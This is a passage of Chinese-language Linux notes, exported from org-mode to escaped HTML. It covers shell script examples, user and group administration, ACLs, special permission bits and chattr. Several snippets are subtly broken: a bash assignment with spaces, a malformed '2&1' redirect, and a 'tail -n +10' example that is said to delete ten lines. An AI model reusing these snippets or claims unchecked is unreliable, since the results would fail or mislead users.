                        echo &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;$file&quot;&lt;/span&gt;
                fi
        done
done
&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot; id=&quot;org9a459f5&quot;&gt;#!/bin/bash
# process new user accounts
input = &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;users.csv&quot;&lt;/span&gt;
while IFS=',' read -r userid name
do
        echo &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;adding $userid&quot;&lt;/span&gt;
        useradd -c &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;$name&quot;&lt;/span&gt; -m $userid
done &amp;lt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;$input&quot;&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org9afcba2&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org9afcba2&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;4.3.4&lt;/span&gt; 控制脚本&lt;/h4&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgcd9b3ab&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgcd9b3ab&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;4.3.5&lt;/span&gt; 创建函数&lt;/h4&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org3865646&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org3865646&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;4.3.6&lt;/span&gt; 使用其他 shell&lt;/h4&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orga9b1aa7&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orga9b1aa7&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;4.4&lt;/span&gt; 实用的脚本示例&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-4-4&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org480e271&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org480e271&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;4.4.1&lt;/span&gt; 编写简单的脚本实用工具&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-4-4-1&quot;&gt;
&lt;/div&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;a id=&quot;org5a533ae&quot;&gt;&lt;/a&gt;归档&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;&lt;a id=&quot;org4dd53e9&quot;&gt;&lt;/a&gt;管理用户账户&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;&lt;a id=&quot;org3e353df&quot;&gt;&lt;/a&gt;检测磁盘空间&lt;br /&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org39888d7&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org39888d7&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;4.4.2&lt;/span&gt; 创建与数据库、Web及E-Mail相关的脚本&lt;/h4&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org3ef3c84&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org3ef3c84&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;4.4.3&lt;/span&gt; 一些小意思的脚本&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-4-4-3&quot;&gt;
&lt;/div&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;a id=&quot;org4238392&quot;&gt;&lt;/a&gt;发送消息&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;&lt;a id=&quot;org9390553&quot;&gt;&lt;/a&gt;获取格言&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;&lt;a id=&quot;org065f027&quot;&gt;&lt;/a&gt;编造借口&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;&lt;a id=&quot;orgc8423af&quot;&gt;&lt;/a&gt;在当前目录及指定子目录深度下创建.gitignore文件&lt;br /&gt;
&lt;div class=&quot;outline-text-5&quot; id=&quot;text-4-4-3-4&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot;&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;!/bin/&lt;/span&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;sh&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;for&lt;/span&gt; dir&lt;span style=&quot;color: #FF1493;&quot;&gt; in&lt;/span&gt; &lt;span style=&quot;color: #AF87FF; font-weight: bold;&quot;&gt;`find ./ -mindepth 2 -maxdepth 4 -type d`&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;do&lt;/span&gt;
        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; $&lt;span style=&quot;color: #FF8C00;&quot;&gt;dir&lt;/span&gt;
        &lt;span style=&quot;color: #AF87FF; font-weight: bold;&quot;&gt;`touch $dir/.gitignore`&lt;/span&gt;
        &lt;span style=&quot;color: #FF1493;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;*&quot;&lt;/span&gt;&amp;gt;$&lt;span style=&quot;color: #FF8C00;&quot;&gt;dir&lt;/span&gt;/.gitignore
&lt;span style=&quot;color: #FF1493;&quot;&gt;done&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a id=&quot;org57eedcd&quot;&gt;&lt;/a&gt;解决 dpkg: warning: files list file for package 'x' missing&lt;br /&gt;
&lt;div class=&quot;outline-text-5&quot; id=&quot;text-4-4-3-5&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;label class=&quot;org-src-name&quot;&gt;&lt;span class=&quot;listing-number&quot;&gt;Listing 1: &lt;/span&gt;&lt;/label&gt;&lt;pre class=&quot;src src-shell&quot;&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;for&lt;/span&gt; package&lt;span style=&quot;color: #FF1493;&quot;&gt; in&lt;/span&gt; $(sudo apt install catdoc 2&amp;amp;1 |grep &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;warning: files list file for package'&quot;&lt;/span&gt; |grep -Po &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;[^'\n ]+'&quot;&lt;/span&gt; |grep -Po &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;[^']+&quot;&lt;/span&gt;);
&lt;span style=&quot;color: #FF1493;&quot;&gt;do&lt;/span&gt;
        sudo apt install --reinstall &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;$package&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;done&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org701d11d&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org701d11d&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;4.4.4&lt;/span&gt; 删除大文件的前n行&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-4-4-4&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;label class=&quot;org-src-name&quot;&gt;&lt;span class=&quot;listing-number&quot;&gt;Listing 2: &lt;/span&gt;示例：删除前10行&lt;/label&gt;&lt;pre class=&quot;src src-shell&quot;&gt;tail -n +10 old_file&amp;gt;new_file
mv new_file old_file
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgc39b827&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgc39b827&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;5&lt;/span&gt; Linux Advanced&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-5&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org76866b2&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org76866b2&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;5.1&lt;/span&gt; Linux User&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-5-1&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgf8a7487&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgf8a7487&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.1.1&lt;/span&gt; Linux User&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-5-1-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
/etc/passwd
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ cat /etc/passwd

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;orgd8001d5&quot;&gt;root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
zrg:x:1000:1000:zrg,,,:/home/zrg:/bin/bash
&lt;/pre&gt;
&lt;/div&gt;
&lt;pre class=&quot;example&quot;&gt;
/etc/passwd 文件的字段包含如下信息：

&lt;/pre&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;登录用户名&lt;/li&gt;
&lt;li&gt;用户密码&lt;/li&gt;
&lt;li&gt;UID&lt;/li&gt;
&lt;li&gt;Group ID&lt;/li&gt;
&lt;li&gt;描述&lt;/li&gt;
&lt;li&gt;HOME目录位置&lt;/li&gt;
&lt;li&gt;默认shell&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&quot;example&quot;&gt;
/etc/passwd 文件中的密码字段都被设置成了x，多数Linux系统都将用户密码保存在/etc/shadow文件中，只有特定的程序（比如登录程序）才能访问这个文件。
一般情况下，不建议直接手动在/etc/passwd文件里进行用户管理（比如添加、修改或删除用户账户）。用标准的Linux用户管理工具去执行这些操作就会安全许多。

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
/etc/shadow
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
/etc/shadow 文件的每条记录都有9个字段：

&lt;/pre&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;与/etc/passwd文件对应的登录名&lt;/li&gt;
&lt;li&gt;加密后的密码&lt;/li&gt;
&lt;li&gt;自上次修改密码后过去的天数密码（自1970年1月1日开始计算）&lt;/li&gt;
&lt;li&gt;多少天后才能更改密码&lt;/li&gt;
&lt;li&gt;多少天后必须更改密码&lt;/li&gt;
&lt;li&gt;密码过期前提前多少天提醒用户更改密码&lt;/li&gt;
&lt;li&gt;密码过期后多少天禁用用户帐目&lt;/li&gt;
&lt;li&gt;用户账户被禁用的日期（用自1970年1月1日到当天的天数表示）&lt;/li&gt;
&lt;li&gt;预留字段给将来使用&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;用户管理文件
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
Home 目录
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
超级用户：/root/
普通用户：/home/zrg/

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
&lt;i&gt;var/spool/mail/zrg&lt;/i&gt;
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
用户邮箱目录

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
/etc/skel
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
在创建用户时，默认复制该目录下的文件到用户的家目录。

&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
新增、删除和修改用户
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
//新增用户
$ sudo useradd -D
or
$ sudo less /etc/default/useradd
See below, the subsection &quot;Changing the default values&quot;.

&lt;/pre&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;GROUP=100 //用户默认组，新用户被添加到GID为100的公共组&lt;/li&gt;
&lt;li&gt;HOME=/home //HOME目录位置&lt;/li&gt;
&lt;li&gt;INACTIVE=-1 //密码过期宽限天数，密码过期后不会被禁用&lt;/li&gt;
&lt;li&gt;EXPIRE= //密码失效时间，未被设置过期日期，密码失效与 /etc/login.defs 默认文件相关。&lt;/li&gt;
&lt;li&gt;SHELL=/bin/sh //将sh作为默认shell&lt;/li&gt;
&lt;li&gt;SKEL=/etc/skel //模板目录，会将/etc/skel目录下的内容复制到用户的HOME目录下&lt;/li&gt;
&lt;li&gt;CREATE_MAIL_SPOOL=no //是否为该用户账户在mail目录下创建一个用于接收邮件的文件&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&quot;example&quot;&gt;
//用上面的默认系统参数创建一个新用户账户
$ sudo useradd test
//要想在创建用户时改变默认值或默认行为，可以使用命令参数，比如:
$ sudo useradd -u 666 -G root,bin -c &quot;test user&quot; -d /home/test -s /bin/bash test

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
//删除用户
默认情况下，userdel命令只会删除/etc/passwd文件中的用户信息，而不会删除系统中属于该账户的任何文件。
$ userdel -r test
加上-r参数，userdel会删除用户的HOME目录以及邮件目录，但必须在删除之前检查清楚（比如是否存放了其他用户或其他程序要使用的重要文件）

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
//修改用户

&lt;/pre&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 28:&lt;/span&gt; 用户账户修改工具&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;命令&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;usermod&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;修改用户账户的字段，指定主要组以及附加组的所属关系&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;passwd&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;修改已有用户的密码&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;chpasswd&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;从文件中读取登录名密码对，并更新密码&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;chage&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;修改密码的过期时间&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;chfn&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;修改用户账户的备注信息&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;chsh&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;修改用户账户的默认登录shell&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
修改密码
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
修改用户密码的命令：passwd

&lt;/pre&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;-S 查询用户密码的状态，仅root用户可用。&lt;/li&gt;
&lt;li&gt;-l 暂时锁定用户。仅root用户可用。&lt;/li&gt;
&lt;li&gt;-u 解锁用户。仅root用户可用。&lt;/li&gt;
&lt;li&gt;&amp;#x2013;stdin 通过管道符输出的数据作为用户的密码。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org8f76537&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org8f76537&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.1.2&lt;/span&gt; Linux Group&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-5-1-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
/etc/group
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
/etc/group文件有4个字段：

&lt;/pre&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;组名&lt;/li&gt;
&lt;li&gt;组密码&lt;/li&gt;
&lt;li&gt;GID&lt;/li&gt;
&lt;li&gt;属于该组的用户列表，当一个用户在/etc/passwd文件中指定某个组作为默认组时，用户账户不会作为该组成员再出现在/etc/group文件中。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
/etc/gshadow
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
/etc/group的加密资讯文件，比如用户组（Group）管理密码就是存放在这个文件。
/etc/gshadow和/etc/group是互补的两个文件；对于大型服务器，针对很多用户和组，定制一些关系结构比较复杂的权限模型，设置用户组密码是极有
必要的。比如我们不想让一些非用户组成员永久拥有用户组的权限和特性，这时我们可以通过密码验证的方式来让某些用户临时拥有一些用户组特性，
这时就要用到用户组密码。

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
$ sudo less /etc/gshadow

&lt;/pre&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;组名：用户组的名称，由字母或数字构成。&lt;/li&gt;
&lt;li&gt;口令：用户组密码，这个段可以是空的或!，如果是空的或有!，表示没有密码。&lt;/li&gt;
&lt;li&gt;组管理者：这个字段也可为空，如果有多个用户组管理者，用,号分割。&lt;/li&gt;
&lt;li&gt;组内用户列表：如果有多个成员，用,号分割 ;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
创建、修改和删除组
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo groupadd shared
$ sudo groupmod -n sharing shared
$ sudo groupdel shared

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
加入组和从组里删除
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo gpasswd -a test tests
$ sudo gpasswd -d test tests

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org4705c62&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org4705c62&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;5.2&lt;/span&gt; Linux Access Control&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-5-2&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgf698806&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgf698806&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.2.1&lt;/span&gt; Linux 细部权限规划：ACL 权限控制&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-5-2-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;什么是 ACL？
&lt;br /&gt;
ACL 是 Access Control List 的缩写，主要的目的是在提供传统的 owner,group,others 的 read,write,execute 权限之外的细部权限配置。
&lt;br /&gt;
ACL 主要可以针对哪些方面来控制权限呢？它主要可以针对以下几个项目：
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;使用者 (user)：可以针对使用者来配置权限；&lt;/li&gt;
&lt;li&gt;群组 (group)：针对群组为对象来配置其权限；&lt;/li&gt;
&lt;li&gt;默认属性 (mask)：还可以针对在该目录下在创建新文件/目录时，规范新数据的默认权限；&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
如何开启 ACL？
&lt;br /&gt;
查看 /dev/sdb1 分区 ACL 权限是否开启。
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo dumpe2fs -h /dev/sdb1
//找到&quot;Default mount options&quot;，查看是否有临时开启分区 ACL 权限

&lt;/pre&gt;
&lt;p&gt;
重新挂载根分区，并挂载加入 acl 权限。
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo mount -o remount,acl /

&lt;/pre&gt;
&lt;p&gt;
永久开启分区 ACL 权限
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo vim /etc/fstab

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;orgb16ad0b&quot;&gt;&lt;span style=&quot;color: #FF8C00;&quot;&gt;UUID&lt;/span&gt;=e50dea0a-bcb6-4921-8762-dd96782846dd / ext4 defaults,acl 0 1     
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;
注意：目前多数 Linux 系统 defaults 默认已经支持 acl 开启了，所以只需要添加 defaults 选项就可以了。重新挂载文件系统或重启系统，使修改生效。
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo mount -o remount /

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;设定 ACL 权限
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
使用 setfacl 命令设定 ACL 权限
&lt;br /&gt;
示例：构建听课权限组，为特定用户设定 ACL 权限
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
# useradd wang
# useradd li
# useradd zhao
# groupadd coursegroup
# mkdir /project
# chown root:coursegroup /project/
# chmod 770 /project
# setfacl -m u:zhao:rwx /project

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
使用 getfacl 命令获取 ACL 设定信息
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
格式: getfacl filename
# getfacl abc.txt

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
针对有效权限(effective permission) mask 的设定
&lt;br /&gt;
&lt;b&gt;有效权限&lt;/b&gt; : 使用者或群组所配置的权限必须要存在于 mask 的权限配置范围内才会生效。
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
配置规范：『 m:[rwx] 』，例如针对某个文件规范为仅有 rx ：
# setfacl -m m:rx /project/testfile

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
针对默认权限和递归(针对目录/子目录下的所有文件)权限的设定
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
配置规范：『 d:[ug]:使用者列表:[rwx] 』
# setfacl -m d:u:zhao:rx -R /project

&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org76d3141&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org76d3141&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;5.2.2&lt;/span&gt; Linux 文件特殊权限&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-5-2-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;SetUID
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;SetUID 介绍
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;只有可执行的二进制程序才能设定 SUID 权限；&lt;/li&gt;
&lt;li&gt;用户拥有该程序的可执行权限；&lt;/li&gt;
&lt;li&gt;在执行该程序时,获得该程序文件所属用户的身份；&lt;/li&gt;
&lt;li&gt;SetUID 只在该程序执行过程中有效.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
设定和取消 SetUID
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
// 查看 passwd 命令的 SetUID
$ ll /usr/bin/passwd

&lt;/pre&gt;
&lt;p&gt;
-rwsr-xr-x 1 root root 59640 3月  23 03:05 /usr/bin/passwd*
&lt;/p&gt;

&lt;pre class=&quot;example&quot;&gt;
// 设定
$ sudo chmod 4755 abc.txt
or
$ sudo chmod u+s abc.txt

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// 取消
$ sudo chmod 755 abc.txt
$ sudo chmod u-s abc.txt

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;注意事项
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;关键目录应严格控制写权限.如&quot;/&quot;,&quot;/usr&quot;&lt;/li&gt;
&lt;li&gt;对系统中默认应该具有 SetUID 权限的文件的统一列表,定期检查.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;SetGID
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;SetGID 介绍
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;只有可执行的二进制程序才能设定 SUID 权限；&lt;/li&gt;
&lt;li&gt;用户拥有该程序的可执行权限；&lt;/li&gt;
&lt;li&gt;在执行该程序时,获得该程序文件所属组的身份；&lt;/li&gt;
&lt;li&gt;SetGID 只在该程序执行过程中有效.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
设定 SetGID
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo chmod 2755 abc.txt
$ sudo chmod g+s abc.txt

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;SetGID 针对目录的作用
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;普通用户必须对此目录拥有r和x权限,才能进入次目录；&lt;/li&gt;
&lt;li&gt;普通用户在此目录中的有效组会变成次目录的属组；&lt;/li&gt;
&lt;li&gt;若普通用户对此目录拥有w权限,新建的文件默认属组是这个目录的属组.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Stiky BIT
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;Stiky BIT 粘着位
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;粘着位只对目录有效&lt;/li&gt;
&lt;li&gt;普通用户对该目录有w和x权限&lt;/li&gt;
&lt;li&gt;如果没有粘着位,普通用户可以删除此目录下所有文件, &lt;b&gt;一旦赋予了粘着位,除了root用户可以删除所有文件,普通用户只能删除自己建立的文件&lt;/b&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
设定 Stiky BIT
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ ll /tmp

&lt;/pre&gt;
&lt;p&gt;
drwxrwxrwt 20 root    root    12288 7月   6 18:02 ./
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo chmod 1755 /tmp
$ sudo chmod o+t /tmp

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
$ sudo chmod 777 /tmp
$ sudo chmod o-t /tmp

&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;chattr
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
命令格式
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
chattr [+-=] 选项 file/directory
+ 新增权限
- 删除权限
= 等于某权限

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// 查看文件chattr属性
格式: lsattr 选项 file/directory
$ lsattr abc.txt

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;选项
&lt;dl class=&quot;org-dl&quot;&gt;
&lt;dt&gt;i&lt;/dt&gt;&lt;dd&gt;对文件: 不允许进行删除或改名, 也不能添加或修改数据; 对目录: 只能修改目录下文件的数据, 但不允许建立和删除文件.&lt;/dd&gt;
&lt;dt&gt;a&lt;/dt&gt;&lt;dd&gt;对文件: 只能在文件中添加数据, 但不能删除或修改数据; 对目录: 只允许创建或修改文件, 但不允许删除文件.&lt;/dd&gt;
&lt;/dl&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orga1acdc8&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orga1acdc8&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;5.3&lt;/span&gt; Linux Server&lt;/h3&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgcee1364&quot; class=&quot;outline-3&quot;&gt;
